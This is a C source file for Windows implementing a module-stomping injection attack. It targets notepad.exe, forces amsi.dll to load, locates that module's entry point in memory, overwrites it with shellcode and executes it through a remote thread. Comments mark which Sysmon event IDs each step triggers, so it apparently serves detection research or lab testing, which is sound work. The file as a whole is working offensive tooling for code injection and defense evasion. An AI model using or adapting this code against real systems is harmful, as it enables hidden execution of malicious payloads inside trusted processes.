#include "common.h"
#include <Psapi.h>

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for module stomping
    // VM_WRITE       — WriteProcessMemory to DLL path and shellcode
    // VM_OPERATION   — VirtualAllocEx for DLL path buffer
    // VM_READ        — ReadProcessMemory for PE headers
    // CREATE_THREAD  — CreateRemoteThread x2
    // QUERY_INFO     — EnumProcessModules, GetModuleBaseName
    DWORD accessMask = PROCESS_VM_WRITE          |
                       PROCESS_VM_OPERATION      |
                       PROCESS_VM_READ           |
                       PROCESS_CREATE_THREAD     |
                       PROCESS_QUERY_INFORMATION;
    wprintf(L"[+] Requested access mask: 0x%08X\n", accessMask);

    // EID 10 fires here
    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Process handle acquired\n");

    // Step 1 — inject amsi.dll path to ensure it is loaded
    wchar_t moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
    LPVOID remoteBuffer = VirtualAllocEx(hProc, NULL,
                          sizeof(moduleToInject),
                          MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProc, remoteBuffer,
                       moduleToInject, sizeof(moduleToInject), NULL);

    PTHREAD_START_ROUTINE loadLib = (PTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleW(L"Kernel32"), "LoadLibraryW");
    HANDLE dllThread = CreateRemoteThread(hProc, NULL, 0,
                                          loadLib, remoteBuffer, 0, NULL);
    WaitForSingleObject(dllThread, 2000);
    wprintf(L"[+] amsi.dll load triggered in notepad\n");

    // Step 2 — find amsi.dll base in notepad
    HMODULE hMods[256] = {};
    DWORD cbNeeded = 0;
    HMODULE remoteModule = NULL;
    CHAR modName[128] = {};

    EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded);
    DWORD modCount = cbNeeded / sizeof(HMODULE);
    wprintf(L"[+] Scanning %lu modules for amsi.dll\n", modCount);

    for (DWORD i = 0; i < modCount; i++) {
        GetModuleBaseNameA(hProc, hMods[i], modName, sizeof(modName));
        if (strcmp(modName, "amsi.dll") == 0) {
            remoteModule = hMods[i];
            wprintf(L"[+] amsi.dll found at: 0x%p\n", remoteModule);
            break;
        }
    }

    if (!remoteModule) {
        wprintf(L"[-] amsi.dll not found after injection\n");
        return 1;
    }

    // Step 3 — read PE headers to get AddressOfEntryPoint
    BYTE headerBuffer[0x1000] = {};
    SIZE_T bytesRead = 0;
    ReadProcessMemory(hProc, remoteModule,
                      headerBuffer, sizeof(headerBuffer), &bytesRead);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)headerBuffer;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(headerBuffer + dos->e_lfanew);

    LPVOID entryPoint = (LPVOID)(
        nt->OptionalHeader.AddressOfEntryPoint +
        (DWORD_PTR)remoteModule
    );
    wprintf(L"[+] amsi.dll entry point at: 0x%p\n", entryPoint);

    // Step 4 — write shellcode to entry point
    // EID 25 may fire here — image modified in memory vs on disk
    SIZE_T written = 0;
    WriteProcessMemory(hProc, entryPoint,
                       shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written to entry point: %zu bytes\n", written);

    // Step 5 — execute shellcode from amsi.dll entry point
    // EID 8 fires — StartModule shows amsi.dll not -
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (PTHREAD_START_ROUTINE)entryPoint,
        NULL, 0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created at amsi.dll entry point\n");
    wprintf(L"[*] EID 25 may show Type: Image is modified\n");
    wprintf(L"[*] EID 8 StartModule should show amsi.dll\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(dllThread);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
